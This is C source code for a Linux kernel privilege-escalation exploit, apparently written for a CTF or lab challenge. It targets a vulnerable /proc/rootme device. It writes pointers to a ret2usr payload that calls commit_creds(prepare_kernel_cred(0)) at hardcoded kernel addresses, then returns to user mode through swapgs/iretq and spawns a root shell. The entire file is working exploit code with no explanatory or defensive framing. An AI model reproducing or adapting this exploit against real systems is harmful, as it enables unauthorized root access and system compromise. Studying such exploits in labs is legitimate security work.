#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>
//gcc exp.c -o exp --no-pie --static
size_t user_cs, user_ss, user_rflags, user_sp;

#define KERNCALL __attribute__((regparm(3)))
void *(*prepare_kernel_cred)(void *)KERNCALL = (void *)0xffffffff8109a620;
void (*commit_creds)(void *) KERNCALL = (void *)0xffffffff8109a250;

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
  __asm__("mov %cs, user_cs\n"
          "mov %ss, user_ss\n"
          "mov %rsp, user_sp\n"
          "pushf\n"
          "pop user_rflags\n");
  puts("[*]status has been saved.");
}

void get()
{

  commit_creds(prepare_kernel_cred(0));
  asm(
      "swapgs\n"
      "pushq user_ss\n"
      "pushq user_sp\n"
      "pushq user_rflags\n"
      "pushq user_cs\n"
      "push $shell\n"
      "iretq\n");
}

void shell()
{
  system("/bin/sh");
  printf("getshell!");
}

int main()
{
  save_status();
  int fd = open("/proc/rootme", 2);

  long long buf[0x500];
  for (int i = 0; i <= 10; i++)
  {
    buf[i] = &get;
  }
  
  write(fd, buf, 0x500);
  return 0;
}